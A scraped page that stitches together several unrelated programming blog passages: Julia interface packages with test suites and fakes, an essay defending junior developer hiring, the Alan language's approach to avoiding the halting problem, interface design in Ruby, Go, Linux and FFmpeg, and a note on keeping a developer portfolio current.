    ) -&gt; DataFrame

Submit  and fetches a query to `table` in `db` asking for results matching
`features`.
"""</span>
<span>function</span><span> easy_query</span><span>(</span><span>db</span><span>::</span><span>AbstractDB</span><span>,</span> <span>table</span><span>::</span><span>String</span><span>,</span> <span>features</span><span>::</span><span>Vector</span><span>{</span><span>Feature</span><span>})</span>
    <span>return</span> <span>fetch</span><span>(</span><span>db</span><span>,</span> <span>query</span><span>(</span><span>db</span><span>,</span> <span>table</span><span>,</span> <span>features</span><span>))</span>
<span>end</span>

<span>end</span>
</code></pre></div></div>

<p>For our purposes, we will assume a <code>Feature</code> type exists and corresponds to a column in a database table with some criteria for selecting rows.
We will also assume that <code>filter</code>ing a <code>DataFrame</code> by some <code>Feature</code>s works, but is too inefficient to be used in practice.</p>

<h3 id="a-problem-with-interface-packages">A problem with interface packages</h3>

<p>While simple to write, interface packages can fall victim to a common failure.
Since interface packages provide little more than function names and docstrings, it’s easy for the packages around them to “go rogue”, changing the function signatures for the interface as they see fit without updating the actual interface package.
This ends up creating a secret, undocumented interface known only to the implemented types and whichever packages manage to use them.</p>

<p>For example, let’s say a concrete subtype of our <code>AbstractDB</code> database example above changes to let a user define a fancy transform to join up results during <code>fetch</code> in a new version.</p>

<div><div><pre><code><span># RogueDB.jl</span>
<span>fetch</span><span>(</span><span>db</span><span>::</span><span>RogueDB</span><span>,</span> <span>response</span><span>::</span><span>Vector</span><span>{</span><span>Response</span><span>},</span> <span>fancy_transform</span><span>::</span><span>Callable</span><span>)</span>
<span>easy_query</span><span>(</span>
    <span>db</span><span>::</span><span>RogueDB</span><span>,</span>
    <span>table</span><span>::</span><span>String</span><span>,</span>
    <span>features</span><span>::</span><span>Vector</span><span>{</span><span>Feature</span><span>},</span>
    <span>fancy_transform</span><span>=</span><span>donothing</span><span>()</span>
<span>)</span>
</code></pre></div></div>

<p>The <code>fancy_transform</code> has a fallback and does not break the contract the interface sets out, but it can cause problems if other packages only refer back to <code>RogueDB</code>.
If another package <code>X</code> claims to use an <code>AbstractDB</code> but makes use of the <code>fancy_transform</code> in both functions and doesn’t fall back to the documented version of <code>fetch</code>, it now can’t switch to another <code>AbstractDB</code>.
This goes unnoticed, as <code>X</code> is only tested against <code>RogueDB</code>.</p>

<p>Say we now want to hook up another DB to <code>X</code> so we make the fetch function when <code>NewDB</code> is created.</p>

<div><div><pre><code><span># NewDB.jl</span>
<span>fetch</span><span>(</span><span>db</span><span>::</span><span>NewDB</span><span>,</span> <span>response</span><span>::</span><span>Vector</span><span>{</span><span>Response</span><span>},</span> <span>fancy_transform</span><span>::</span><span>Callable</span><span>)</span>
</code></pre></div></div>

<p>The above <code>fetch</code> <em>does</em> break the contract with the interface package, but <code>X</code> has been used for several months and nobody questions the API, so <code>fetch</code> without the <code>fancy_transform</code> is not implemented.
<code>X</code> uses the default <code>easy_query</code> with <code>NewDB</code>, which does not include the <code>fancy_transform</code> argument.
Calling <code>easy_query</code> will cause a <code>MethodError</code>, but <code>X</code> only calls that function in an untested (or mocked) special case and the bug goes unseen.</p>

<p>Further suppose that <code>AbstractDB</code> has been at v0.1 for 2 years and still has the original definition of <code>fetch</code>.
There are several other DB packages being used in other packages that use the documented <code>fetch</code>, but nobody has noticed they are different.
Now the interface package doesn’t serve its purpose, as other packages using the interface as documented will fail to run the rogue implementations.
New implementations will have to guess at the secret interface set up by the rogue packages in order to fit into the existing ecosystem.
The version of the interface being used is dependent upon multiple packages, potentially causing chaos!</p>

<h2 id="test-utils">Test Utils</h2>

<p>Having a robust set of test utilities gives an interface package enough muscle to enforce the contract it sets out.</p>

<p>A good test utility for an interface package contains two key components:</p>
<ul>
  <li>A test fake: a simplified implementation of the type for user packages to play with.</li>
  <li>A test suite codifying a minimum set of constraints an implementation must obey to be considered legitimate.</li>
</ul>

<h3 id="the-test-suite">The Test Suite</h3>

<h4 id="how">How?</h4>

<p>The test suite is a function or set of functions that work as a validation test for a concrete implementation of a type.
It should codify the expectations of the abstract type (e.g., function signatures, return types) as precisely as possible.
The tests should check that a new implementation does not break the contract that an abstract type sets out.</p>

<p>The test suite should simply test that the interface for the type works as expected.
It does not replace unit tests for the correctness of output or any special-cased behaviour, nor can it be expected to check any implementation details or corner cases.
The test suites should be run as part of the unit tests for any implementation of the type.
If the API changes, it should give instant feedback when the expectations of the abstract type are not met.</p>

<p>A minimal test suite for the database example might look like the following:</p>

<div><div><pre><code><span>"""
    test_interface(db::AbstractDB, table::String, features::Vector{Feature})

Check if an `AbstractDB` follows the documented structure.
The arguments supplied to this function should be identical to those for a
successful `query`.
"""</span>
<span>function</span><span> test_interface</span><span>(</span><span>db</span><span>::</span><span>AbstractDB</span><span>,</span> <span>table</span><span>::</span><span>String</span><span>,</span> <span>features</span><span>::</span><span>Vector</span><span>{</span><span>Feature</span><span>})</span>
    <span>q</span> <span>=</span> <span>query</span><span>(</span><span>db</span><span>,</span> <span>table</span><span>,</span> <span>features</span><span>)</span>
    <span>@test</span> <span>q</span> <span>isa</span> <span>AbstractResponse</span>

    <span>df</span> <span>=</span> <span>fetch</span><span>(</span><span>db</span><span>,</span> <span>resp</span><span>)</span>
    <span>@test</span> <span>df</span> <span>isa</span> <span>DataFrame</span>

    <span>@test</span> <span>filter</span><span>(</span><span>df</span><span>,</span> <span>features</span><span>)</span> <span>==</span> <span>df</span>

    <span># Check easy_query gives the same results as long form</span>
    <span>@test</span> <span>easy_query</span><span>(</span><span>db</span><span>,</span> <span>table</span><span>,</span> <span>features</span><span>)</span> <span>==</span> <span>df</span>

    <span>resp2</span> <span>=</span> <span>fetch</span><span>(</span><span>db</span><span>,</span> <span>[</span><span>resp</span><span>,</span> <span>resp</span><span>])</span>
    <span>@test</span> <span>resp2</span> <span>isa</span> <span>AbstractResponse</span>
    <span>@test</span> <span>fetch</span><span>(</span><span>db</span><span>,</span> <span>resp</span><span>)</span> <span>isa</span> <span>DataFrame</span>
<span>end</span>
</code></pre></div></div>

<h4 id="why">Why?</h4>

<p>The test suite puts the power to define the API back into the hands of the interface package.
A package using these tests can be trusted to have defined the functions we need in the form that we expect, so long as the tests pass.
When the interface package changes, the failing tests will serve as a sign to update all related packages to stay consistent with the interface.</p>

<p>The test suite is also handy for creating new implementations.
The test suite is ready-made to be used in <a href="https://en.wikipedia.org/wiki/Test-driven_development">test-driven development</a> and helps clear up any ambiguities that might exist in the docstrings.</p>

<h3 id="the-test-fake">The Test Fake</h3>

<h4 id="how-1">How?</h4>

<p>Test fakes are a kind of <a href="https://en.wikipedia.org/wiki/Test_double">test double</a>.
They have a working implementation but take some shortcuts, which makes them suitable only for testing functionality.
Ideally, a test fake should:</p>
<ul>
  <li>Be easy to construct.</li>
  <li>Only enact the minimum expectations of the API for the abstract type.</li>
  <li>Give easily verifiable outputs.</li>
</ul>

<p>Test fakes should be used in tests for any package using the abstract type in order to avoid depending on any “real” version.</p>

<p>Below we show what a lazy implementation of a test fake for the database example might look like:</p>

<div><div><pre><code><span>struct</span><span> FakeDB</span> <span>&lt;:</span> <span>AbstractDB</span>
    <span>data</span><span>::</span><span>Dict</span><span>{</span><span>String</span><span>,</span> <span>DataFrame</span><span>}</span>
<span>end</span>

<span>struct</span><span> FakeResponse</span> <span>&lt;:</span> <span>AbstractResponse</span>
    <span>fetched</span><span>::</span><span>DataFrame</span>
<span>end</span>

<span>FakeDB</span><span>(</span><span>data_dir</span><span>::</span><span>Path</span><span>)</span> <span>=</span> <span>FakeDB</span><span>(</span><span>populate_data</span><span>(</span><span>data_dir</span><span>))</span>

<span>function</span><span> query</span><span>(</span><span>db</span><span>::</span><span>FakeDB</span><span>,</span> <span>table</span><span>::</span><span>String</span><span>,</span> <span>features</span><span>::</span><span>Vector</span><span>{</span><span>Feature</span><span>})</span>
    <span>data</span> <span>=</span> <span>db</span><span>[</span><span>table</span><span>]</span>
    <span>return</span> <span>FakeResponse</span><span>(</span><span>filter</span><span>(</span><span>data</span><span>,</span> <span>features</span><span>))</span>
<span>end</span>

<span>fetch</span><span>(</span><span>::</span><span>FakeDB</span><span>,</span> <span>r</span><span>::</span><span>FakeResponse</span><span>)</span> <span>=</span> <span>r</span><span>.</span><span>fetched</span>
<span>fetch</span><span>(</span><span>::</span><span>FakeDB</span><span>,</span> <span>rs</span><span>:</span><span>Vector</span><span>{</span><span>FakeResponse</span><span>})</span> <span>=</span> <span>join</span><span>(</span><span>fetch</span><span>.</span><span>(</span><span>rs</span><span>)</span><span>…</span><span>)</span>
</code></pre></div></div>

<p>To make sure things are consistent, the <code>test_interface</code> function from the section above should be run on <code>FakeDB</code> as part of the tests for <code>AbstractDB</code>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article lang="en">
    

    <div>
  

<p>Let me tell you the story of a very successful company that made a very big, dumb decision.</p>

<blockquote>
<p>We don’t hire junior developers or interns…if you don’t get a puppy, you don’t have to clean up its messes.</p>

<p>~ <a href="https://www.quora.com/Why-aren%E2%80%99t-there-interns-at-Netflix">Netflix</a></p>
</blockquote>

<p>I’m flabbergasted that some corporate schmuck figured out a way to cast puppies in a negative light and people kept listening. I mean, puppies are the purest beings on planet Earth. Literally made out of playtime and fur. Bright spots in a lonely world. But I digress.</p>

<p>A lot of companies have followed suit with a “we only hire seniors” strategy. When asked why, they’ll offer responses like:</p>

<ul>
<li>We don’t have the time or resources to hire junior developers; we’re moving too quickly.</li>
<li>The company can afford senior developers, so there’s no need to hire juniors.</li>
<li>We can’t afford to make mistakes at this point. The stakes are too high.</li>
<li>Our organization gives a lot of autonomy to its employees. We aren’t set up for the kind of hand-holding that juniors need.</li>
<li>We want to get our base software product in place before we hire anyone inexperienced.</li>
</ul>

<p>The implication here is that junior developers are a liability, something that a company takes on out of a sense of duty or because of an ailing budget. And the implication of <em>that</em> is, well, maybe other companies can afford to do corporate charity projects and substandard work, but <em>we</em> sure can’t.</p>

<p>By the way, there are <a href="https://www.selectusa.gov/software-and-information-technology-services-industry-united-states">over 100,000</a> tech companies in the US, and I’ve never heard <em>one</em> single CEO say “our mistakes don’t matter a lot” or “we need a way to spend some of this loose cash we’ve got sitting around.” So, all you “senior developer only” outfits, whatever shortcut you think you’re taking, whatever system you think you’re cheating, the reality is that you’ve hallucinated the entire thing. There’s no competitive advantage to shutting out juniors. And you’ve outed yourself as a poorly-managed company.</p>

<blockquote><p lang="en" dir="ltr">Hostility to junior developers is an easy way to spot a toxic company culture.</p>— April Wensel (@aprilwensel) <a href="https://twitter.com/aprilwensel/status/892398893203202048?ref_src=twsrc%5Etfw">August 1, 2017</a></blockquote>



<p>The way you hire and treat junior developers is a valuable proxy measure for the health of your organization, your product line, and your internal culture. Senior developers know this. And if that isn’t compelling enough, hiring a fair balance of junior developers is a smart financial decision as well.</p>

<h3 id="preventing-messes">Preventing messes</h3>

<p>If you refuse to hire junior developers because they make “messes,” you’re sending a strong and unintended message about your company culture: no mistakes allowed. You’re painting yourself as the company that fires somebody every time a server goes down. Regardless of how much you pay, nobody wants to work in an environment where job security is touch-and-go. And trying to initimidate developers into making less mistakes spreads a culture of fear and initimidation, which is disastrous for mental health and productivity.</p>

<p>You might argue that this attitude encourages developers to be cautious and implement processes that guard against error: automated testing, QA, failovers, access protection, and reversible code changes, to name a few. But this theory is entirely backwards. If company guidelines encourage the use of failsafes like these and the company provides the time and resources for developers to implement them, the “no mistakes allowed” culture isn’t necessary or valuable; most issues will be caught long before they reach production. And every developer, junior and senior, thrives in an environment where strong development processes protect them from worst-case scenarios.</p>

<p>What about the errors that make it past every layer of prevention you’ve put in place? Think of them as valuable opportunities to shore up your defenses. Junior developers, admittedly, usually uncover these opportunities sooner than senior developers. So the only question is, do you want to debug your process sooner or do you want to debug it later? “Never” is not a choice, as any experienced developer will tell you. If something can go wrong, eventually it will. No amount of experience can prevent human error.</p>

<p>Naturally, you’ll need a few senior development and ops leaders to lay the groundwork and set precedents for an error-resistant development cycle. Nobody’s saying you should <em>only</em> hire junior developers. But if you truly have a workplace that cares about mistakes–that is, a workplace where mistakes are caught early and often–junior developers will fit right in. And developers of all levels will enjoy higher job satisfaction, since error resistance liberates them to build great software (instead of constant firefighting) and protects their nights and weekends.</p>

<h3 id="saving-money">Saving money</h3>

<p>According to Indeed, a <a href="https://www.indeed.com/salaries/Junior-Software-Engineer-Salaries">Junior Software Engineer</a> makes an average salary of $55,394, while a <a href="https://www.indeed.com/salaries/Senior-Software-Engineer-Salaries">Senior Software Engineer</a> makes an average salary of $117,374. A Senior costs more than two times as much as a Junior.</p>

<p>The cost is often justified. Senior developers are expected to be more productive than junior developers. That’s not the whole story, though, and thoughtlessly writing it off as the cost of doing business is both lazy and expensive.</p>

<p>Not all application code requires years of experience to write, or even to write well. Every program includes “glue code” that connects various inputs and outputs in a mundane way. It doesn’t matter a lot who writes it. You can pay someone $28 an hour to do it, or you can pay someone $59 an hour to do it. Either way it will come out about the same. If you only hire seniors, you’re paying a premium for a great deal of entry-level work.</p>

<p>Code also varies significantly from application to application, and familiarity is a key factor in productivity. In most cases, a junior developer with six months of experience on a team will be more effective than a senior developer who just signed on, for no other reason than familiarity with the domain.</p>

<p>The aforementioned glue code and domain-specific code account for at least half of all development work. What remains is code that truly demands and benefits from the expertise of a senior developer. And even for this code, a junior developer can do outstanding work if they have access to sufficient educational resources and the guidance of an experienced mentor.</p>

<p>For these reasons, a pairing of one junior and one senior developer is generally equivalent to two senior developers, and comes at less than 75% of the total cost. If your goal is maximum productivity for minimal expense, this junior/senior pair should be the fundamental molecule of your organization.</p>

<p>As an aside, one factor that’s impossible to account for in these numbers is the widespread tendency of senior developers to debate about topics that end up being trivial–such as algorithms, microsecond optimizations, and code style. If an organization hires only seniors and doesn’t have a rock-solid decision-making process in place, hundreds of payroll hours can be lost to these arguments. Junior developers rarely have this kind of problem.</p>

<h3 id="building-careers">Building careers</h3>

<p>If you don’t hire junior developers, another message you’re sending is that you don’t know how career progression works.</p>

<blockquote><p lang="en" dir="ltr">Sometimes when companies say they're not hiring junior developers I want to shake them by their hoodies and yell, where do you think senior developers come from?!</p>— Kate Heddleston (@heddle317) <a href="https://twitter.com/heddle317/status/1040061861817868288?ref_src=twsrc%5Etfw">September 13, 2018</a></blockquote>



<p>Again, this isn’t about corporate citizenship or “doing your part” in the tech community. This is about making your company a decent place to work so that developers will join your company and stay long enough to make an impact.</p>

<p>I’ve heard a few developers say “I’m done changing job titles. I just want to be a senior developer forever.” However, I’ve never heard one say “I hope I never get a pay raise or learn something new or get recognized for my achievements ever again.” And, inconveniently, the resources necessary to sustain ambitious ladder-climbers and complacent but passionate senior developers are about the same. You need ways to measure and recognize a job well done, plentiful educational resources, and a variety of projects young and old in your development pipeline. You need to create a sense of progress, even for those few who don’t want a promotion.</p>

<p>But don’t get stuck on those folks. They’re a minority. Most people in tech aren’t planning on being senior developers for 40 years straight. We dream of being software architects, team leads, CTOs, and founders. And a company that advertises its blatant disinterest in career progression is going to rank dead last on our list of prospective employers.</p>

<blockquote><div lang="en" dir="ltr"><p>I only recruit senior devs.</p><p>The trick is, I recruit some of them earlier in their career.</p></div>— Reginald Braithwaite (@raganwald) <a href="https://twitter.com/raganwald/status/1041714965781073920?ref_src=twsrc%5Etfw">September 17, 2018</a></blockquote>



<p>One of the most impressive things a developer can hear as they walk into a job interview is, “Hi, I’m a team lead, I’ve worked here for eight years and I joined the company as an intern.” Impressive and very rare. That person is intensely valuable to the company–they know the product line in and out, they’ve seen code from every project within a 100-yard radius, and they’ve worked alongside everyone in the organization. They can innovate within that company in a way that very few can. And the company is earning inestimable dividends on that person’s work because they figured out how to keep them interested for eight years–about one tenth of their life expectancy. That’s a sign of success for the company’s culture. It marks a workplace where morale is high, good work is recognized, and interesting projects are waiting around every corner.</p>

<p>Saying “we don’t hire juniors,” on the other hand, is an open admission that your company isn’t prepared to be part of someone’s career. It essentially advertises stagnancy: the company expects experienced and talented developers to join the company and contribute indefinitely while getting nothing but a paycheck for their efforts. Some might be willing to do that, but you’ll never see their best work.</p>

<p><strong>4 November 2020 | Luis F. De Pombo, David Ellis</strong></p>
<p>Can we write programs with predictable execution that could be automatically parallelized? Part of the work of Alan Turing and Alonzo Church on <a href="https://en.wikipedia.org/wiki/Computability">computability</a> demonstrated that for some programs it cannot be determined ahead of time whether or not the program can be computed. This constitutes the crux of the <a href="https://en.wikipedia.org/wiki/Halting_problem">Halting Problem</a>. This "Turing-Completeness Problem" is not an issue with what they have shown, but how the software development process is hindered by the lack of assurances on computability and our industry's lack of recognition of the burden this has put onto software developers. Further, it has been exacerbated by recent computing mechanisms, such as multithreading, NUMA, GPGPU, and distributed computing, which have moved away from the "single tape" Turing Machine model of computation that most programming languages are founded upon.</p>
<p>The following snippet of C code succinctly contains the problems of Turing completeness complicating modern development:</p>
<pre><code>while (node) {
  doSomethingWith(node);
  node = node-&gt;next;
}
</code></pre>
<ol>
<li><em>Automatic Parallelization</em> - It's not possible to automatically parallelize this code. The number of nodes is not clear to the compiler for it to potentially bunch those calls across threads, and it's also unclear if the function call mutates the node and adds/removes nodes to process.</li>
<li><em>Halting Problem</em> - It's not possible to know if the code will halt, even ignoring the idea that <code>doSomethingWith</code> may always add a new <code>node</code> to the one it is processing, there's nothing stopping a node from pointing at itself and never halting that way.</li>
</ol>
<p>Automatic parallelization is only a problem because we want/need to parallelize our code. Until very recently this was a niche need as <a href="https://www.karlrupp.net/2015/06/40-years-of-microprocessor-trend-data/">computing power had been increasing exponentially for decades and has only flattened in the past decade</a>. If this was still the case it is likely that it would have remained a niche problem that only experts need to worry about, but with multicore now the norm even in personal laptops and unlikely to go away as <a href="http://www.fisgeo.unipg.it/luca.gammaitoni/fisinfo/documenti-fisici/physical-limits-silicon.pdf">signal propagation itself becomes the limiting factor</a>, it has become a problem for the average developer, as well.</p>
<p>The issue with the Halting Problem itself is much more contentious. Turing demonstrated that it is not possible to determine whether arbitrary compute will halt or run forever so this lack of determinism has been tolerated as an unfortunate reality of all compute that must simply be dealt with. However, we posit that no <em>practially useful</em> computation will take forever because its result cannot affect the finite reality of our lives, so programmers have already been finding an imperfect subset of Turing completeness for their own problem domains in an ad-hoc intuitive sense to be able to actually produce valuable calculations for their users.</p>
<p>In a single-threaded world, this problem has been mostly a small annoyance -- on those occasions where you have written infinitely-looping code, find the section of code that the processor is executing over and over again, study how it entered this state, and figure out how to prevent that state from occurring again -- or abort on detection of said state. But in a multi-threaded, multi-machined cluster computing world, on those occasions where you have written an infinite loop, even detecting an infinite loop that spans multiple machines is a challenge, let alone gathering the data you need to debug the cause of this invalid state. This is further exacerbated by the non-determinism inherent to multiple interacting Turing machines not executing in lockstep with each other making reproduction of the problem even more difficult.</p>
<p>Side-stepping the Halting Problem by defining a barely-Turing-incomplete subset, also makes the automatic parallelization story possible. Now the compiler can work with code that it can determine where and how it could parallelize the work and has the ability to model its finite execution time to determine whether or not parallelization is worth it under various conditions.</p>
<p>This is the thesis of <a href="https://github.com/alantech/alan">the Alan programming language</a>, that with minor syntax constraints (that we believe the vast majority of developers will not notice, or at least won't mind) we can be sure that the code you write always halts, and we can parallelize your code for you. We can make models for runtime estimates at compile time that only require the size and "shape" of the data to get an answer and can therefore determine not only how to parallelize your code, but whether or not it makes sense given the data being operated on. We have not yet accomplished all of these claims, but this is now only a matter of time and effort. :)</p>
<p>The root of most of the problems with the example C code involves the ambiguity in the data structure and the behavior of the user-defined function. The other problem is that the while loop is an unbounded looping construct that cannot be reasoned about except "the body of the while loop is executed zero or more times." In Alan, <em>arbitrary</em> looping and recursion are disallowed, and all data is built on top of data types with knowable constraints, no arbitrary JUMP statements or data pointer logic allowed.</p>
<p>What this means in practice is that instead of writing that while loop above for your list of nodes, you would write something like:</p>
<pre><code>nodes.each(doSomethingWith)
</code></pre>
<p>Your intent to perform a side-effect action on each of the nodes in the list is clear, and the Alan compiler can determine the "purity" of the function -- whether or not it mutates the input argument or an outer scope -- to determine if it <em>could</em> execute the operations in parallel. Then at runtime it can use the estimated execution time of the function, the number of nodes in the <code>nodes</code> array, and the cost to distribute that work across multiple threads, to decide <em>if</em> it will execute the operations in parallel.</p>
<p>This can even apply across simple sequentially-written lines of code:</p>
<pre><code>fn example(file1: string, file2: string): Array&lt;Array&lt;int64&gt;&gt; {
  const matrix1 = loadFile(file1).parseMatrix()
  const matrix2 = loadFile(file2).parseMatrix()
  return matrix1 * matrix2
}
</code></pre>
<p>Not only is the matrix multiplication a trivially parallelizable operation that likely will be parallelized for any large-ish matrix, but reading the files from disk and then parsing their contents may be done in parallel before the matrix multiplication because the performance benefit is there to do so.</p>
<p>To accomplish automatic parallelization, we need something different from a classic Turing tape to compile to. We call this the Alan Graphcode: a bytecode format with graph annotations that is guaranteed to have no cycles. A dependency graph of operations to perform, with some of these also having a subgraph of operations to perform, provides us with the information we need to know which operations are safe to execute in parallel, coupled with (implied) operation execution time estimates to determine if it makes sense to do so.</p>
<p>Alan's acyclic graphcode seems incompatible with any sort of control flow at first glance, though, since a dependency graph of operations that must all be executed appears to preclude the behavior of <code>JUMP</code> operations, like the classic <a href="https://www.aldeid.com/wiki/X86-assembly/Instructions/jnz">JNZ (Jump if Not Zero)</a>. <a href="https://github.com/alantech/alan">Alan</a> allows <code>if</code> statements and even <a href="https://docs.alan-lang.org/std_seq.html">guaranteed halting versions of classic looping constructs are in a standard library</a> that provide a predictable "worst case" execution time based on a maximum iteration count allowed. We will demonstrate how Alan allows control flow with a graph-based representation that makes automatic parallelization possible.</p>
<p><img src="https://alan-lang.org/turing-tape.png" alt="Turing Tape Example with JNZ"></p>
<p>Here two operations <code>OP1</code> and <code>OP2</code> run, then a <code>JNZ</code> runs. If the check is not zero, it skips to only run <code>OP5</code> and <code>OP6</code>, otherwise it runs <code>OP3</code> and <code>OP4</code> before running <code>OP5</code> and <code>OP6</code>.</p>
<p>This is a basic if statement for something like:</p>
<pre><code>var a = op1();
var b = op2(a);
if (b) {
  var c = op3();
  a = op4(c);
}
var d = op5(a);
return op6(d);
</code></pre>
<p>The equivalent representation in a graph would be something like:</p>
<p><img src="https://alan-lang.org/graph-if.png" alt="Graph Example with if"></p>
<p>Here, the conditional call is a special <code>COND</code> node that may or may not execute the specified graph named <code>if</code>. All of the nodes of the main graph are executed, but the <code>COND</code> operation may or may not execute the inner subgraph. There is absolutely no parallelization possible based on the set of dependencies, but it's clear that <code>OP5</code> can't run until both <code>OP1</code> and <code>COND(if)</code> are run.</p>
<p>Back to classic Turing machines, what is the opposite of an <code>if</code> statement in a Turing tape? It's not <code>else if</code> or <code>else</code> as those are just other forward jumps on different conditions. The opposite of an <code>if</code> is a <code>do-while</code> statement, because that is a jump <em>backwards</em>. </p>
<p><img src="https://alan-lang.org/turing-loop.png" alt="Turing Tape Example with JNZ-based loop"></p>
<pre><code>var a = op1();
var b = op2(a);
do {
  var c = op3();
  a = op4(c);
  var d = op5(a);
} while (d);
op6(a);
</code></pre>
<p>The equivalent in a graph representation would be:</p>
<p><img src="https://alan-lang.org/graph-loop.png" alt="Graph Example with do-while loop"></p>
<p>Here a <code>DOWHILE</code> opcode runs the loop sub-graph over and over until the expected condition is met. So with these two special opcodes <code>COND</code> and <code>DOWHILE</code> we can reproduce the behavior of <code>JNZ</code>'s forwards and backwards jumping and we can enter infinite loops with <code>DOWHILE</code>, meaning we should be Turing Complete.</p>
<p>So how do we make this barely <em>not</em> Turing complete? We make a list/array type a first class citizen in the VM itself and then we only add operations that know the bounds that they are to operate on based on that list or some other condition that cannot be <em>directly</em> mutated by the user's own code.</p>
<p>Now for an array of data we can have an <code>each</code> opcode that applies a given sub-graph of operations to every node in the array. The Alan runtime, or AVM, can tell based on the expected execution time of the graph and the number of nodes and the cost to send that data to multiple threads whether or not to do a fork-join or not. Probably no for 10 elements and probably yes for 10 billion, but where's the threshold and why? That's something better left for a computer to decide in realtime …</p></main></div></div></div></div>

<h3>Good software design – Introduction</h3>
<p>To write useful and long term maintainable software we tend to look out for patterns and group them into abstractions and it seems that’s the case for devs behind Linux and FFmpeg too.</p>
<blockquote>
<h4>Software design</h4>
<p>When we’re creating software, we’re building data structures and defining their behaviors and dependencies. The way we create and link them can be seen as the design/architecture of the software.</p>
<p>Let’s say we’re building a media framework that encodes/decodes video and audio. The codecs <a href="https://aomedia.org/" target="_blank" rel="noopener">AV1</a>, H264, HEVC, and AAC all do some common operations and if we can provide a <strong>generic abstraction that holds these common operations</strong> and data we can use this concept <strong>instead of</strong> relying on the concrete idea of what <strong>a specific codec</strong> does.</p></blockquote>
<p>Through the years many&nbsp;<a href="https://martinfowler.com/articles/is-quality-worth-cost.html" target="_blank" rel="noopener">developers noticed that software with a good design</a>&nbsp;is a good idea that&nbsp;<a href="https://www.martinfowler.com/bliki/Yagni.html" target="_blank" rel="noopener">pays off as software grows in complexity</a>.</p>
<p>This is one of the ideas behind the good design for software, to rely on <strong>components</strong> that are <strong>weakly linked</strong> and with <strong>boundaries</strong> around <strong>what it should do</strong>.</p>
<h3>Ruby</h3>
<p>Maybe it’s easier to see all these concepts in practice. Let’s code a quick pseudo media stream framework that provides&nbsp;encoding&nbsp;and&nbsp;decoding&nbsp;for several codecs.</p>

<p>This pseudo-code in <a href="https://www.ruby-lang.org/en/" target="_blank" rel="noopener">ruby</a> tries to recreate what we’re discussing above, there is an <strong>implicit concept here</strong> of what operations a codec must have, in this case, the operations are <em>encode</em> and&nbsp;<em>decode</em>. Since&nbsp;<a href="https://en.wikipedia.org/wiki/Duck_typing" target="_blank" rel="noopener">ruby is a dynamically typed language</a>&nbsp;any class can present these two operations and act as a codec&nbsp;for us.</p>
<blockquote><p>Developers sometimes may use the words: contract, API, interface, behavior and operations as synonyms.</p></blockquote>
<p>This design might be considered good because if we want to add a new codec we just need to provide an implementation and add it to the list, even the list could be built in a dynamic way but the idea is that this code seems easy to extend and maintain because it tries to keep link between the components weak (<strong>low coupling</strong>) and each component does only what it should do (<strong>cohese</strong>).</p>
<blockquote><p>Rails framework even enforce some way to organize the code, it adopts the model-view-controller (MVC) architecture</p></blockquote>
<h3>Golang</h3>
<p>When we go (no pun intended) to a <strong>statically typed language</strong>&nbsp;like&nbsp;<a href="https://golang.org/" target="_blank" rel="noopener">golang</a>&nbsp;we need to be more formal, describing the required types but it’s still doable.</p>

<p>We first define the abstract operations (functions in this case) in a <strong>generic&nbsp;struct</strong>&nbsp;and then <strong>we fill it</strong> with the <strong>concrete code</strong>, like the&nbsp;av1&nbsp;decoder and encoder real code.</p>
<p>Many other languages have somewhat <a href="https://clojure.org/reference/protocols" target="_blank" rel="noopener">similar mechanisms</a> to dispatch methods or functions as if they were part of an agreed protocol and then the system integration code can deal only with this high-level abstractions.</p>
<h3>Linux Kernel – Everything is a file</h3>
<p>Have you ever heard the expression&nbsp;<a href="https://en.wikipedia.org/wiki/Everything_is_a_file" target="_blank" rel="noopener">everything is a file in Linux</a>? The idea is to have a common interface for all kinds of resources in Linux, for instance, Linux handles network socket, special files (like&nbsp;/<a href="https://www.tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html" target="_blank" rel="noopener">proc</a>/cpuinfo) or even USB devices as files.</p>
<p>This is a powerful idea that can make easy to write or use programs for linux since we can rely in a set of well known operations from this <strong>abstraction called file</strong>. Let’s see this in action:</p>

</div>
<p>For the input files, FFmpeg creates a struct called&nbsp;<a href="https://github.com/FFmpeg/FFmpeg/blob/master/libavformat/avformat.h#L640" target="_blank" rel="noopener">AVInputFormat</a>&nbsp;that is implemented by any format (video container) that wants to be used as an input.&nbsp;<a href="https://github.com/FFmpeg/FFmpeg/blob/master/libavformat/matroskadec.c#L4229" target="_blank" rel="noopener">MKV files fill this structure with</a> its implementation as the&nbsp;<a href="https://github.com/FFmpeg/FFmpeg/blob/master/libavformat/mov.c#L7997" target="_blank" rel="noopener">MP4 format</a>&nbsp;too.</p>

</div><p>This design allows new codecs, formats, and protocols to be integrated and released easier. <a href="https://code.videolan.org/videolan/dav1d" target="_blank" rel="noopener">DAV1d</a> (an av1 open-source implementation) was integrated into FFmpeg May this year and&nbsp;<a href="https://git.ffmpeg.org/gitweb/ffmpeg.git/commitdiff/beaa350e24167f4ff31275a6114693f5ce7cd409" target="_blank" rel="noopener">you can follow along the commit diff</a>&nbsp;to see how easy it was. In the end, it needs to register itself as an available codec and follow the expected operations.</p></div>]]>

                  <p>How do clients know if you are the right developers for their job? how do they find you? How do they learn to trust you? The answer to all these questions is, as you might guess, you reference or commonly known as your portfolio. It's generally a list of websites/applications you worked on. Over time your references are supposed to grow giving bigger chances to convince future employers or customers on what you can do and the type of projects you have already worked on.</p>

<p>Some of the most frequent questions employers ask when they interview you are to tell them a bit about yourself, and the second is to require your portfolio. It's an important piece of information which serves as your back up. Most employers and customers would even try to find and go through your portfolio before you even get to interact with them.</p>

<p>I quite remember some years back a friend said something touching to me. He said this to:  <strong>zooboole, you always present the same portfolio every year.</strong> </p>

<p>From 2002 to now, if I had even 10% of the projects I worked on alive, I would look insane in the eye of the average person. </p>

<p><em>That friend and I as well had no idea that portfolios must be maintained over time.</em> I write this post today to educate anyone who might not be aware of this subtle information. </p>

<p>Like any other thing in this life, time is a big threat to your reference. It sucks away everything. A few problems start to rise to cause your references to dying over time:</p>

<h2>- Most of the websites start to die.</h2>

<p>Either the owner does not want to maintain it anymore or the hosting expires and they don't bother/can't afford to renew.</p>

<h2>- The technologies you used "are dead" or are no more relevant in the professional field</h2>

<p>Technologies evolve and new ones pop up every single day. When you become too good at one, and suddenly another one comes to dominate the market share, you find yourself in the lifted side of the scale.</p>

<h2>- You lose the control</h2>

<p>Sometimes clients can decide to change their developer. Although you were the one who built and maybe was maintaining their website, they may decide to go away with you and handle the work over to a different person or to a new team. From there you have no control over how the project will become. As time goes, you start to realize that your work is disappearing, and you can't refer to it as your work anymore.</p>

